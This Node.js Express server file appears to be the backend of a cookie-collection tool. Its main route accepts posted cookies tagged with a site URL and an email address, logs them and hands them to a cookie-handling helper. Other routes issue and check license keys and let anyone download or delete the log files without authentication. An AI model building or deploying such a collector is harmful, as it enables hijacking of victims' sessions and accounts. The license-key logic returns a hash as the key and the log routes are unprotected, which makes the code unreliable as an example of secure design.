require("dotenv").config();

const express = require("express");
const utils = require('./utils');
const logger = require("./logger");
const cors = require("cors");
const { v4: uuidv4 } = require('uuid');
const bcrypt = require("bcrypt");
const { unlinkSync, open, close } = require("fs");
const API = require("./models/API");

const app = express();

const PORT = process.env.PORT || 3000;

let RUNNING = 0;

if (RUNNING === 0) { utils.keepTheServerRunning(); RUNNING = 1; };

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(cors());

app.get("/", async (req, res) => {
    res.send({ status: "Server is Up and Running!" });
});

app.post("/", (req, res) => {
    logger.log(2, `New Cookies received: ${req.body.url}, ${req.body.email}`);
    utils.handleCookies(req.body);
    res.json("Data recieved successfully!");

});

app.get("/download_log_file", (req, res) => {
    const filename = req.query.filename;

    if (!filename) return res.status(400).send({ error: "Missing file path in query params." });
    if (!["errors", "info", "warnings"].includes(filename)) return res.status(400).send({ error: "This provided file is not available." });

    res.download(`./logs/${filename}.log`);
});

app.get("/delete_log_file", (req, res) => {
    const filename = req.query.filename;

    if (!filename) return res.status(400).send({ error: "Missing file path in query params." });
    if (!["errors", "info", "warnings"].includes(filename)) return res.status(400).send({ error: "This provided file is not available." });

    try {
        unlinkSync(`./logs/${filename}.log`);

        open(`./logs/${filename}.log`, "wx", function (err, fd) {
            // handle error
            close(fd, function (err) { /*handle error*/ });
        });

        res.send({ status: "success" });
    } catch (error) {
        res.status(500).send({ error: error });
    };
    
});

app.post("/generate-api", async (req, res) => {
    const customerEmail = req.body.customerEmail;
    const securityKey = req.body.securityKey;

    if (securityKey === process.env.SECURITY_KEY) {

        const saltRounds = 10;
        const token = uuidv4();
        const hashedToken = await bcrypt.hash(token, saltRounds);
        const api = new API({ email: customerEmail, api_key: hashedToken });
        await api.save();

        res.send({ message: "ok", api: hashedToken });

    } else {
        res.status(403).send({ message: "invalid security key" });
    };
});

app.post("/validate-api", async (req, res) => {
    const licenseKey = req.body.licenseKey;
    const result = await API.findOne({ api_key: licenseKey }).exec();

    if (result) {
        res.send({ message: "ok" });
    } else {
        res.status(403).send({ message: "error" });
    }
});

app.listen(PORT, () => {
    logger.log(2, `Server is running on port ${PORT}`);
});
